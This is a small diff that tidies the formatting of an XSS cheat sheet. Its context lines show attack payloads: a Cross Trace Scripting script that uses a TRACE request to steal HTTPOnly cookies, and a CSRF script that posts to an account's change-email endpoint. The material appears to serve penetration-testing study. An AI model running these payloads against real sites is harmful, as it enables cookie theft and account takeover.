@@ -54,7 +54,7 @@ body:sessionStorage.getItem('sessionID')
 
 ### Cross Trace Scripting
 
-By default cookies with the HTTPOnly attribute set to true are invisible to browser scripts because they are sent only through GET or POST HTTP(S) requests. In order to obtain these cookie we make the user send a TRACE request to the server&#x20;
+By default cookies with the HTTPOnly attribute set to true are invisible to browser scripts because they are sent only through GET or POST HTTP(S) requests. In order to obtain these cookie we make the user send a TRACE request to the server
 
 ```
 <script>
@@ -110,7 +110,7 @@ window.setInterval(function(){
 
 ### CSRF
 
-Use the following payload to send a request using AJAX to a page of the application. Can be used for instance to request  password reset for the user
+Use the following payload to send a request using AJAX to a page of the application. Can be used for instance to request password reset for the user
 
 ```
 <script>
@@ -120,8 +120,8 @@ req.open('get','<URL>',true);
 req.send();
 function handleResponse() {
     var target = new XMLHttpRequest();
-    target .open('post', '/my-account/change-email', true);
-    target .send(<body>)
+    target.open('post', '/my-account/change-email', true);
+    target.send(<body>)
 };
 </script>
 ```
